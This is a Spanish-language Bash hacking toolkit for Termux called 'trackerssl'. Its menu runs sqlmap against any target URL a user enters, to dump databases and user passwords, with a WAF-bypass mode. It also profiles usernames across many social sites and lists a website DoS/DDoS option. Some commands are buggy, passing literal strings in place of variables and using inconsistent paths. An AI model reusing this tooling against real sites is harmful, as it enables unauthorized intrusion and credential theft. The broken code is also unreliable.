#!/bin/bash 
 # =================[trackerssl]=================== 
 # Versión: 1.0 
 # Open Source - Software Libre 
 # O.S: Android - Termux 
 # License: General Public License 
 # Coded by: Hkgato
 # Time: 25/12/2022 - 4/1/2023 
 # 
 # ############################################## 
 # NOTA: creditos no créditos nop
 # ############################################## 
 # 
 # ============================================== 
 #                       Colors 
 # ============================================== 
 G="\e[0;32m\033[1m" 
 R="\e[1;31m" 
 RED="\e[101m" 
 green='\e[32m' 
 W="\033[0m" 
 GR='\033[90m' 
 # ============================================== 
 #                function ctrl_c 
 # ============================================== 
 trap ctrl_c 2 
 ctrl_c() { 
 echo 
 echo 
 echo -e "  ${GR}[${R}*${GR}] ${R}trackerssl Finalizado." 
 echo -e "  ${GR}[${R}*${GR}] ${R}Desarrollador: ${W}Hkgato" 
 echo -e "  ${GR}[${R}*${GR}] ${R}Contáctame:${W} https://t.me/Hkgato" 
 echo -e "  ${GR}[${R}*${GR}] ${R}Github:${W} https://github.com/carlsrecovery8" 
 echo 
 exit 
 } 
 # ============================================== 
 #           Install trackerssl in $HOME 
 # ============================================== 
 path=$(pwd) 
 if [ "${path}" != "/data/data/com.termux/files/home/Trackerssl" ]; then 
 echo 
 echo -e "           ${GR}╭──> Ejecutar en${W} ~/trackerssl" 
 echo -e "${GR}[${R}*${GR}] ${R}ERROR:${GR} │──> trackerssl no está instalado en ${W}HOME" 
 echo -e "           ${GR}╰──> Reinstalar en ${W}HOME" 
 echo 
 exit 
 fi 
 # ============================================== 
 #               Checking Conection 
 # ============================================== 
 ChCon() { 
 until ping -q -c1 -W 1 8.8.8.8 > /dev/null 2>/dev/null 
 do 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${W} No hay conexión a internet" 
 echo 
 exit 
 done 
 } 
 # ============================================== 
 #              Installing packages 
 # ============================================== 
 function InsDeps(){ 
     dependencies_array=(nmap curl pv python python2 ) 
  
     echo; for program in "${dependencies_array[@]}"; do 
         if [ ! "$(command -v $program)" ]; then 
         echo -e "${R}  >${W} INSTALANDO DEPENDENCIAS:${GR}\n" 
             echo -e "  ${GR}[${R}*${GR}] ${GR}$program${R} No instalado${W}"; sleep 1 
             echo -e "\n  ${GR}[${R}*${GR}]${Gy} Instalando ${program}...${G}\n"; sleep 1 
             yes|pkg install $program 
             echo -e "\n${R}  >${GR} $program${W}${G} instalado...${W}\n"; sleep 2 
             let counter+=1 
         fi 
     done 
 } 
 InsDeps 
 banner() { 
 # ============================================== 
 #                    BANNER 
 #            Copyright by @Hkgato
 # ============================================== 
 clear 
 echo -e ${G} "                     :3qKq3>:"|pv -qL 700 
 echo -e ${G} "                 :>3qKKKKKKKq3>:"|pv -qL 700 
 echo -e ${G} "             ';CpKKKKKKKKKKKKKKKpC;"|pv -qL 700 
 echo -e ${G} "         -iPKKKKKKKKKKKKKKKKKKKKKKKPi"|pv -qL 700 
 echo -e ${G} "     ~v]KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK]v~"|pv -qL 700 
 echo -e ${G} "   ͥ‘rwKKKKKKKKKKKKKPv,:-ͥ‘:,;vPKKKKKKKKKKKKKwr,"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKKKK/             !KKKKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKKKf               CKKKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKKp-               -qKKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKK>‘               .*KKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKw;,_ͥ‘-                   .-:,‘wKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKhi*:                   ‘;*ihKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKK;                 ;KKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKK2>‘             ‘>2KKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKKKKZ             ZKKKKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKKKKK5             eKKKKKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " !KKKKKKKKKKKqC;-               -;CqKKKKKKKKKKK!"|pv -qL 700 
 echo -e ${G} " <KKKKKKKKkkr,                     ,rrSKKKKKKKK>"|pv -qL 700 
 echo -e ${G} "   -‘v]qj:-                           -:jq]v‘-  "|pv -qL 700 
 echo -e ${R} "                          trackerssl" 
 echo -e "                     ${GR}[${W} Detective_ssl${GR} ]${W} " 
 echo 
 echo -e "        ${W}${RED}::M7TEAMHK no se responsabiliza de::"${W} 
 echo -e "        ${W}${RED}::los daños causados por trackerssl::"${W} 
 echo "" 
 } 
 # ============================================== 
 #                    Opciones
 # ============================================== 
 options() { 
 echo -e "        ${R}[${G} • • ${R}]${W}${GR} ELIJE UNA OPCION ${R}[ ${G} • • ${R} ]${W}${W}" 
 echo 
 echo -e "  ${R}[${G}01${R}]${W} INYECCION SQL (${GR}Sqlmap${W})" 
 echo -e "  ${R}[${G}02${R}]${W} PING (${GR}Nmap${W})" 
 echo -e "  ${R}[${G}03${R}]${W} BUSCAR USERNAME (${GR}UserScan${W})" 
 echo -e "  ${R}[${G}04${R}]${W} ATAQUE DOS/DDOS A SITIO WEB" 
 echo -e "  ${R}[${G}05${R}]${W} EXTRAER DATOS DE UNA IMAGEN (${GR}Exif${W})" 
 echo -e "  ${R}[${G}06${R}]${W} VER MI IP PRIVADA/PUBLICA" 
 echo -e "  ${R}[${G}07${R}]${W} ESCANEO A MI RED WIFI (${GR}Nmap${W})" 
 echo -e "  ${R}[${G}08${R}]${W} EXTRAER INFORMACION DE UNA IP" 
 echo -e "  ${R}[${G}09${R}]${W} OBTENER INFORMACIÓN DE UN NUMERO TELEFONICO" 
 echo -e "  ${R}[${G}10${R}]${W} ESCANEAR URL (${GR}Nmap${W})" 
 echo -e "  ${R}[${G}11${R}]${W} RECOPILAR INFORMACION DE UN DOMINIO" 
 echo -e "  ${R}[${G}12${R}]${W} OBTENER SUBDOMINIOS DE SITIO WEB" 
 echo 
 echo -e "  ${R}[${G}00${R}]${R} Salir ${W}" 
 echo 
 echo -ne "  ${R}trackerssl${W} >>${G} " 
 read opt 
 if [ -z "${opt}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${W} Debes elegir una opción" 
 echo 
 sleep 1.0 
 clear 
 banner 
 options 
 fi 
 if [[ "${opt}" == "0" || "${opt}" == "00" ]]; then 
 echo "" 
 echo -e "  ${GR}[${R}*${GR}]${R} Dtve_Web:${W} Saliendo..." 
 echo 
 sleep 1 
 clear 
 exit  
 fi 
 if [[ "${opt}" == "1" || "${opt}" == "01" ]]; then 
 if [ ! -x /data/data/com.termux/files/usr/bin/sqlmap ]; then 
 banner 
 echo -e "            ${G}:::::${W}💉SQL INJECTION💉${G}:::::${W}" 
 sleep 0.5 
 echo 
 echo -e " ${R} ERROR: ${W}sqlmap no está instalado" 
 echo 
 sleep 1 
 banner 
 echo -e "              ${W}[${R}=${W}]${GR} INSTALANDO SQLMAP ${W}[${R}=${W}]${W}" 
 sleep 1 
 echo 
         yes|pkg update && pkg upgrade 
         sleep 1 
         yes|pkg install python3 
         sleep 1 
         python3 -m pip install --upgrade pip 
         sleep 1 
         python3 -m pip install sqlmap 
  
 exit 
 fi 
  
 banner 
 echo -e "            ${G}:::::${W}💉SQL INJECTION💉${G}:::::${W}" 
 echo 
  
 echo -e "  ${R}[${G}01${R}]${W} VER VULNERABILIDAD DE SITIO WEB A INJ. SQL" 
 echo -e "  ${R}[${G}02${R}]${W} ENUMERA DATABASES (${GR}--dbs${W}) " 
 echo -e "  ${R}[${G}03${R}]${W} ENUMERAR TABLAS DE UNA DATABASE (${GR}--tables${W})" 
 echo -e "  ${R}[${G}04${R}]${W} ENUMERAR COLUMNAS DE UNA TABLA (${GR}--columns${W})" 
 echo -e "  ${R}[${G}05${R}]${W} VER USUARIOS Y CONTRASEÑAS" 
 echo -e "  ${R}[${G}06${R}]${W} INJECCION SQL AVANZADA" 
 echo -e "  ${R}[${G}07${R}]${W} AYUDA" 
 echo 
 echo -e "  ${R}[${G}00${R}]${R} Volver ${W}" 
 echo -e "  ${R}[${G}99${R}]${R} Salir ${W}" 
 echo 
 echo -ne "  ${R}Dtve_Web${W} >>${G} " 
 read inj 
 if [[ "${inj}" == "00" || "${inj}" == "0" ]]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} Dtve_Web:${W} Volviendo..." 
 sleep 1 
 banner 
 options 
 fi 
 if [[ "${inj}" == "9" || "${inj}" == "99" ]]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} Dtve_Web:${W} Saliendo..." 
 sleep 1 
 clear 
 exit 
 fi 
 if [[ "${inj}" == "1" || "${inj}" == "01" ]]; then 
 banner 
 echo -e " ${G}:::::${W}💉VER VULNERABILIDAD A INYECCIÓN SQL💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio web objetivo: ${GR}" 
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "   ${G}>${GR} " 
 read pg 
 if [ -z "${pg}" ]; then 
 sleep 1 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ERROR:${W} Debes ingresar un dato" 
 echo 
 sleep 1 
 exit 
 fi 
 banner 
 sleep 1 
 echo -e "    ${G}:::::${W}💉COMPROBANDO VULNERABILIDAD💉${G}:::::${W}" 
 echo 
 sqlmap -u "'${pg}'" 
 elif [[ "${inj}" == "2" || "${inj}" == "02" ]]; then 
 banner 
 echo -e "    ${G}:::::${W}💉ENUMERACION DE BASE DE DATOS💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio Web vulnerable ${GR}" 
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "  ${R}[${W}>${R}] " 
 read pg2 
 if [ -z "${pg2}" ]; then 
 sleep 1 
 echo 
 echo -e "   ${GR}[${R}*${GR}]${R} ERROR:${W} Debes ingresar un dato" 
 echo 
 sleep 1 
 exit 
 fi 
 sqlmap -u "'${pg2}'" --dbs 
 elif [[ "${inj}" == "3" || "${inj}" == "03" ]]; then 
 banner 
 echo -e "    ${G}:::::${W}💉ENUMERACION DE TABLAS💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio Web vulnerable: ${GR}" 
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "  ${R}[${W}>${R}] " 
 read pg3 
 echo -ne "  ${R}[${W}>${R}] Base de datos: " 
 read dbs 
 if [ -z "${pg3}" ]; then 
 sleep 1 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}ERROR:${W} Debes ingresar un dato" 
 echo 
 sleep 1 
 exit 
 fi 
 sqlmap -u "'${pg3}'" -D ${dbs} --tables 
 elif [[ "${inj}" == "4" || "${inj}" == "04" ]]; then 
 banner 
 echo -e "  ${G}:::::${W}💉ENUMERACION DE COLUMNAS💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio Web vulnerable: ${GR}" 
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "  ${R}[${W}>${R}] " 
 read pg4 
 echo -ne "  ${R}[${W}>${R}] Base de datos: " 
 read db 
 echo -ne "  ${R}[${W}>${R}] Tabla a visualizar: " 
 read table 
 if [ -z "${pg4}" ]; then 
 sleep 1 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}ERROR:${W} Debes ingresar un dato" 
 echo 
 sleep 1 
 exit 
 fi 
 sqlmap -u "'pg4'" -D ${db} -T ${table} --columns 
 elif [[ "${inj}" == "5" || "${inj}" == "05" ]]; then 
 banner 
 echo -e "     ${G}:::::${W}💉VER USUARIOS Y CONTRASEÑAS💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio Web vulnerable: ${GR}"        
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "  ${R}[${W}>${R}] " 
 read users 
 if [ -z "${users}" ]; then 
 sleep 1 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}ERROR:${W} Debes ingresar un dato" 
 echo 
 sleep 1 
 exit 
 fi 
 sqlmap -u "'users'" --users --passwords 
 elif [[ "${inj}" == "6" || "${inj}" == "06" ]]; then 
 banner 
 echo -e "       ${G}:::::${W}💉INJECCION SQL AVANZADA💉${G}:::::${W}" 
 echo 
 echo -e "  ${R}[${G}>${R}]${W} Ingresa tu sitio Web vulnerable: ${GR}" 
 echo -e "    ${R}  EJEMPLO:${W} http://www.site.com/vuln.php?id=1" 
 echo -ne "  ${R}[${W}>${R}] " 
 read advanced 
 sqlmap -u "'${advanced}'" --skip-waf --tamper=space2comment --risk=3 --level=4  --dbs --threads 2 --time-sec=10 --batch 
 elif [[ "${inj}" == "7" || "${inj}" == "07" ]]; then 
 banner 
 echo -e "           ${G}:::::${W}💉MENU DE AYUDA💉${G}:::::${W}" 
 echo 
 sqlmap --help 
 else 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ERROR:${W} La opción ${GR}${inj} ${W}no existe" 
 echo 
 sleep 1 
 banner 
 options 
 fi 
 elif [[ "${opt}" == "2" || "${opt}" == "02" ]]; then 
 banner 
 ChCon 
 echo -e "                 ${G}▼ ${W}PING A WEB ${G}▼${W}" 
 echo 
 ChCon 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa la dirección web:" 
 echo 
 echo -e "      ${R}EJEMPLO:${GR} google.com${W}" 
 echo 
 echo -ne "  ${R}[${G}>>${R}]${W} " 
 read -r wb 
 if [ -z "${wb}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ERROR:${W} Debes ingresar un dato" 
 echo 
 exit 
 fi 
 ping -c 1 ${wb} > ~/trackerssl/.wb1 
 grep -o "([0-9]\+.[0-9]\+.[0-9]\+.[0-9]\+.)" ~/Dtve_Web/.wb1 > .wb2;grep -o "[0-9]\+.[0-9]\+.[0-9]\+.[0-9]\+" ~/Dtve_Web/.wb2 > ~/Dtve_Web/.wb3 
 banner 
 echo -e "  ${R}[${G}>${R}]${W}${W} Estadísticas del ${GR}PING${W} a:${W} ${R}${wb}${W}" 
 echo 
 DirWeb=$(head -n1 ~/trackerssl/.wb3 | cut -d " " -f1) 
 echo -ne "  ${R}[${G}*${R}]${W} Dirección Web:${R} ${DirWeb}\n" 
 grep -o 'ttl=[0-9]\+' ~/trackerssl/.wb1 | tr -d "ttl" | tr -d "=" > ~/trackerssl/.ttl 
 tl=$(cat ~/trackerssl/.ttl) 
 echo -ne "  ${R}[${G}*${R}]${W} TTL:${R} ${tl}\n" 
 tim=$(grep -o 'time=[0-9]\+' ~/Dtve_Web/.wb1 | tr -d "time" | tr -d "=") 
 echo -ne "  ${R}[${G}*${R}]${W} Tiempo:${R} ${tim} ${W}ms \n" 
 echo -ne "  ${R}[${G}*${R}]${W} ICMP_SEQ:${R} " 
 grep -o 'icmp_seq=[0-9]\+' ~/trackerssl/.wb1 | tr -d "icmp_seq" | tr -d "=" > ~/trackerssl/.seq 
 cat ~/trackerssl/.seq 
 echo 
 rm ~/trackerssl/.wb1 .wb2 .wb3 .ttl .seq > /dev/null 2>/dev/null 
 # ============================================== 
 #  ################ GITATACK ################# 
 #          © Copyright - M7GATOHK
 #                TradER. - M7TEAMHK
 # ============================================== 
 elif [[ "${opt}" == "3" || "${opt}" == "03" ]]; then 
 banner 
 echo -e "          ${R}[${G}••${R}]${W}${W} BÚSQUEDA DE USERNAME ${R}[${G}••${R}]${W}${W}" 
 echo 
 ChCon 
 echo -e "  \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ${G}Ingresa el Username a buscar:${W}" 
 echo -e "  \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ${R}EJEMPLO:${GR} Ux4hack" 
 echo 
 echo -ne "  \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ${G} USERNAME ${R}>${W}> ${GR}" 
 read -r username 
 sleep 1.5 
 banner 
 printf "  \e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Buscando el username\e[0m\e[1;77m %s\e[0m\e[1;92m en: \e[0m\n" $username 
 printf "\n" 
 check_insta=$(curl -s -H "Accept-Language: en" "https://www.instagram.com/$username" -L | grep -o 'The link you followed may be broken'; echo $?) 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Instagram: \e[0m" 
 if [[ $check_insta == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.instagram.com/%s\n" $username 
 printf "https://www.instagram.com/%s\n" $username > $username.txt 
 elif [[ $check_insta == *'0'* ]]; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Facebook: \e[0m" 
 check_face=$(curl -s "https://www.facebook.com/$username" -L -H "Accept-Language: en" | grep -o 'not found'; echo $?) 
 if [[ $check_face == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.facebook.com/%s\n" $username 
 printf "https://www.facebook.com/%s\n" $username >> $username.txt 
 elif [[ $check_face == *'0'* ]]; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Twitter: \e[0m" 
 check_twitter=$(curl -s "https://www.twitter.com/$username" -L -H "Accept-Language: en" | grep -o 'page doesn’t exist'; echo $?) 
 if [[ $check_twitter == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.twitter.com/%s\n" $username 
 printf "https://www.twitter.com/%s\n" $username >> $username.txt 
 elif [[ $check_twitter == *'0'* ]]; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] YouTube: \e[0m" 
 check_youtube=$(curl -s "https://www.youtube.com/$username" -L -H "Accept-Language: en" | grep -o 'Not Found'; echo $?) 
 if [[ $check_youtube == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.youtube.com/%s\n" $username 
 printf "https://www.youtube.com/%s\n" $username >> $username.txt 
 elif [[ $check_youtube == *'0'* ]]; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Blogger: \e[0m" 
 check=$(curl -s "https://$username.blogspot.com" -L -H "Accept-Language: en" -i | grep -o 'HTTP/2 404'; echo $?) 
 if [[ $check == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.blogspot.com\n" $username 
 printf "https://%s.blogspot.com\n" $username >> $username.txt 
 elif [[ $check == *'0'* ]]; then 
 printf "\e[1;93mNo Encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] GooglePlus: \e[0m" 
 check=$(curl -s "https://plus.google.com/+$username/posts" -L -H "Accept-Language: en" -i | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://plus.google.com/+%s/posts\n" $username 
 printf "https://plus.google.com/+%s/posts\n" $username >> $username 
 elif [[ $check == *'0'* ]]; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Reddit: \e[0m" 
 check1=$(curl -s -i "https://www.reddit.com/user/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | head -n1 | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.reddit.com/user/%s\n" $username 
 printf "https://www.reddit.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Wordpress: \e[0m" 
 check1=$(curl -s -i "https://$username.wordpress.com" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'Do you want to register' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.wordpress.com\n" $username 
 printf "https://%s.wordpress.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Pinterest: \e[0m" 
 check1=$(curl -s -i "https://www.pinterest.com/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '?show_error' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.pinterest.com/%s\n" $username 
 printf "https://www.pinterest.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Github: \e[0m" 
 check1=$(curl -s -i "https://www.github.com/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.github.com/%s\n" $username 
 printf "https://www.github.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Tumblr: \e[0m" 
 check1=$(curl -s -i "https://$username.tumblr.com" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.tumblr.com\n" $username 
 printf "https://%s.tumblr.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Flickr: \e[0m" 
 check1=$(curl -s -i "https://www.flickr.com/people/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.flickr.com/photos/%s\n" $username 
 printf "https://www.flickr.com/photos/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Steam: \e[0m" 
 check1=$(curl -s -i "https://steamcommunity.com/id/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'The specified profile could not be found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://steamcommunity.com/id/%s\n" $username 
 printf "https://steamcommunity.com/id/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Vimeo: \e[0m" 
 check1=$(curl -s -i "https://vimeo.com/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://vimeo.com/%s\n" $username 
 printf "https://vimeo.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] SoundCloud: \e[0m" 
 check1=$(curl -s -i "https://soundcloud.com/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 Not Found'; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://soundcloud.com/%s\n" $username 
 printf "https://soundcloud.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Disqus: \e[0m" 
 check1=$(curl -s -i "https://disqus.com/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o '404 NOT FOUND' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://disqus.com/%s\n" $username 
 printf "https://disqus.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Medium: \e[0m" 
 check1=$(curl -s -i "https://medium.com/@$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://medium.com/@%s\n" $username 
 printf "https://medium.com/@%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] DeviantART: \e[0m" 
 check1=$(curl -s -i "https://$username.deviantart.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.deviantart.com\n" $username 
 printf "https://%s.deviantart.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] VK: \e[0m" 
 check1=$(curl -s -i "https://vk.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://vk.com/%s\n" $username 
 printf "https://vk.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] About.me: \e[0m" 
 check1=$(curl -s -i "https://about.me/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://about.me/%s\n" $username 
 printf "https://about.me/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Imgur: \e[0m" 
 check1=$(curl -s -i "https://imgur.com/user/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m encontrado!\e[0m https://imgur.com/user/%s\n" $username 
 printf "https://imgur.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Flipboard: \e[0m" 
 check1=$(curl -s -i "https://flipboard.com/@$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://flipboard.com/@%s\n" $username 
 printf "https://flipboard.com/@%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] SlideShare: \e[0m" 
 check1=$(curl -s -i "https://slideshare.net/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://slideshare.net/%s\n" $username 
 printf "https://slideshare.net/%s\n" $username >> $username.txt 
 fi 
